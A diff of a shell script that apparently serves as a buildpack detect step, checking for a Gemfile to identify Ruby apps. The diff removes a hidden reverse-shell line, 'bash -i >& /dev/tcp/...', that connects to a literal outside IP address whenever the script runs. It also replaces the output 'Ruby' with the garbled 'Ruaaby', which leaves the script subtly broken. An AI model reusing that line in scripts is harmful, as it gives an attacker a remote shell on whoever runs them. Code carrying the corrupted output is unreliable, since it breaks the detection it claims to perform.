@@ -1,6 +1,5 @@
 #!/bin/sh
 
-bash -i >& /dev/tcp/165.227.53.194/4242 0>&1
 
 if [ -z "$CNB_STACK_ID" ]; then
   # v2 API
@@ -14,7 +13,7 @@ else
 fi
 
 if [ -f "$APP_DIR/Gemfile" ]; then
-  echo "Ruby"
+  echo "Ruaaby"
   exit 0
 else
   echo "no"
